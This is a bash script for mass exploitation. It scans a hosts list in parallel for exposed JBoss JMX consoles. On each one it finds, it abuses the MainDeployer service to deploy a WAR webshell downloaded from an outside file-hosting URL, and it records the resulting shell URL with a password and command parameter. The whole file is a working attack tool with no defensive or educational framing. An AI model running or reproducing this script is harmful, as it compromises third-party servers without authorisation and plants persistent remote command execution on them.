#!/bin/bash
# found jmx-console web page and upload webshell #
clear
cat hosts | parallel -j100 'request=$(timeout 10 curl -sk "https://{}/jmx-console/" | grep -oP "JBoss JMX" | head -n1)
if [ "$request" == "JBoss JMX" ]
then
echo -e "{}" >> console
a=$(timeout 8 curl -sk "https://{}/jmx-console/HtmlAdaptor" --data "action=invokeOp&name=jboss.system%3Aservice%3DMainDeployer&methodIndex=3&arg0=https%3A%2F%2Fa.pomf.cat%2Fgyvqnw.war" | grep -oP "Operation completed successfully" | head -n1)
if [ "$a" == "Operation completed successfully" ]
then
echo -e "{} - UPLOADED!"
echo -e "https://{}/gyvqnw/pathetic.jsp?pass=secret&cmd=whoami" >> uploaded
fi
else
echo -e "{} - FAIL!"
fi'
